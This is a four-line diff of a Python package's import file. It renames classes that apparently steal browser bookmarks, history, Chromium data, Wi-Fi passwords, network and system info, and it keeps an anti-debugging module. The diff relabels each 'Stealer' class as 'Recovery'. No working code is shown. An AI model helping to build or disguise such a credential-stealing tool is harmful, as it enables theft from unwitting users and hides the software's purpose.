@@ -1,4 +1,4 @@
 from .antidebug import Antidebug
-from .browsers import WebBookmarksStealer, WebHistoryStealer, ChromiumStealer
-from .network import NetworkInfoStealer, WifiPasswordStealer
-from .systeminfo import SystemInfoStealer
+from .browsers import WebBookmarksRecovery, WebHistoryRecovery, ChromiumRecovery
+from .network import NetworkInfoRecovery, WifiPasswordRecovery
+from .systeminfo import SystemInfoRecovery
